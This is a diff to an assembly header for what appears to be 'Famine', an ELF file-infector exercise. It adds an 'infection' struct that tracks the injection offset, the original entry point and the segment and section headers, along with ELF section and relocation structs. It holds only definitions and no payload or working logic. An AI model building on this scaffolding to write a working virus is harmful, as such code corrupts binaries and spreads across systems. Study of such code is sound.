@@ -6,6 +6,7 @@
 %define		SYS_LSEEK		8
 %define		SYS_MMAP		9
 %define		SYS_UNMAP		11
+%define		SYS_FTRUNCATE	77
 
 ; OPEN
 %define		O_RDONLY			0x0000
@@ -52,15 +53,26 @@ struc famine
 endstruc
 
 struc infection
-	.file_fd		resq	1
-	.map_addr		resq	1
-	.map_size		resq	1
-	.seg_end_offset	resq	1
+	.file_fd			resq	1
+	.map_addr			resq	1
+	.map_size			resq	1
+	.seg_nb				resb	1
+	.seg_hdr_addr		resq	1
+	.last_seg_hdr_addr	resq	1
+	.injection_offset	resq	1
+	.sec_hdr_addr		resq	1	
+	.original_entry 	resq	1
+	.original_end		resq	1
+	.add_page			resb	1
+	.shstrtab_addr		resq	1
+	.got_str_index		resq	1
 endstruc
 
 ; ELF structures
-%define	PT_LOAD	0x1
-%define PF_X	0x1
+%define	PT_LOAD		0x1
+%define PF_X		0x1
+%define SHT_STRTAB	0x3
+%define SHT_RELA	0x4
 
 struc	elf64_ehdr
 	.e_ident:		resb	16
@@ -88,6 +100,25 @@ struc	elf64_phdr
 	.p_filesz:		resq	1
 	.p_memsz:		resq	1
 	.p_align:		resq	1
+endstruc
+
+struc elf64_shdr
+	.sh_name:		resd	1
+	.sh_type:		resd	1
+	.sh_flags:		resq	1
+	.sh_addr:		resq	1
+	.sh_offset:		resq	1
+	.sh_size:		resq	1
+	.sh_link:		resd	1
+	.sh_info:		resd	1
+	.sh_addralign	resq	1
+	.sh_entsize		resq	1
+endstruc
+
+struc elf64_rela
+	.r_offset		resq	1
+	.r_info			resq	1
+	.r_addend		resq	1
 endstruc
 
 ; %macro writeWork 0
